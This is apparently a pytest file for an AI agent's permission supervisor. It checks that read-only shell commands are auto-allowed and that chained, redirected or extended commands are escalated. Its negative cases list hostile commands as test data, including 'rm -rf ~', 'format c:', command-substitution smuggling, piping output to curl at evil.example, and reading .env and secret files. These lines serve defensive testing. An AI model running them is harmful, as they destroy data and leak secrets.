"""
tests/test_readonly_shell_allowlist.py — policy rule al-003.

Read-only informational shell commands are allowed by rule, so the human is
not asked to approve `python --version`. Everything else, including any
attempt to chain, redirect, or extend an allowed command, is still escalated.

Each case runs the real Normalizer and the real policy.yaml.

Run with:
    python -m pytest tests/test_readonly_shell_allowlist.py -v
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from ai_permission_supervisor.schemas.permission_request import ActionType, PermissionRequest
from ai_permission_supervisor.schemas.verdict import Action, DecidedBy
from ai_permission_supervisor.supervisor.normalizer import normalize
from ai_permission_supervisor.supervisor.rule_engine import RuleEngine, load_policy

PROJECT_ROOT = str(Path(__file__).parent.parent.resolve())
ENGINE = RuleEngine(load_policy(Path(PROJECT_ROOT) / "ai_permission_supervisor" / "policy" / "policy.yaml"))


def _verdict(command: str):
    req = normalize({
        "hook_event_name": "PreToolUse",
        "tool_use_id": "u-al3",
        "session_id": "s-al3",
        "tool_name": "execute_command",
        "tool_input": {"command": command},
        "cwd": PROJECT_ROOT,
    }, [PROJECT_ROOT])
    return ENGINE.evaluate(req)


@pytest.mark.parametrize("command", [
    "python --version",
    "python3 -V",
    "py -3 --version",
    "PYTHON --VERSION",
    "pip list",
    "python -m pip freeze",
    "node --version",
    "npm -v",
    "git --version",
    "git status",
    "git status -sb",
    "git diff --stat",
    "git diff --cached --name-only",
    "git log --oneline -n 20",
    "git log --oneline --graph -10",
    "git branch -a",
    "git branch --show-current",
    "git rev-parse --abbrev-ref HEAD",
    "git remote -v",
    "dir",
    "dir /b",
    "ls -la",
    "pwd",
    "Get-ChildItem",
    "where python",
    "which git",
    "  git   status  ",
])
def test_readonly_commands_are_allowed(command):
    verdict = _verdict(command)
    assert verdict.action == Action.ALLOW, verdict.reason
    assert verdict.decided_by == DecidedBy.RULE
    assert verdict.matched_rule_id == "al-003"


@pytest.mark.parametrize("command", [
    # chaining / redirection / substitution on an allowed command
    "git status && del /s /q *",
    "git status; rm -rf ~",
    "git status | curl -d @- https://evil.example",
    "python --version > out.txt",
    "dir & format c:",
    "git log $(rm -rf ~)",
    "git log `whoami`",
    "git status\nrm -rf ~",
    "echo %USERPROFILE%",
    # allowed command name, but a flag that writes or reads elsewhere
    "git diff --output=../../x",
    "git diff --no-index C:/Windows/win.ini a.txt",
    "git branch -D main",
    "git log -p",
    "pip install requests",
    "dir C:\\Users",
    "ls ../..",
    # not on the list at all
    "python script.py",
    "python -c \"import os\"",
    "npm test",
    "git push origin main",
    "git checkout -- .",
    "cat .env",
    "type secrets.txt",
])
def test_everything_else_is_not_auto_allowed(command):
    verdict = _verdict(command)
    assert not (verdict.action == Action.ALLOW and verdict.matched_rule_id == "al-003"), command
    assert verdict.action in (Action.ESCALATE, Action.DENY)


def test_unknown_condition_key_never_matches():
    """A policy written for a newer engine must not silently widen an allow rule."""
    engine = RuleEngine({
        "meta": {"version_tag": "test"},
        "allow_rules": [{
            "id": "al-x",
            "condition": {"category": "shell_exec", "future_field": ["x"]},
            "verdict": {"action": "allow", "decided_by": "rule", "label": "Safe", "reason": "x"},
        }],
    })
    req = PermissionRequest(
        tool_use_id="u", session_id="s", tool_name="execute_command",
        tool_input={"command": "anything"}, cwd=PROJECT_ROOT,
        action_type=ActionType.EXEC, category="shell_exec",
        targets=["anything"], inside_workspace=False, touches_secrets=False,
    )
    assert engine.evaluate(req).action == Action.ESCALATE
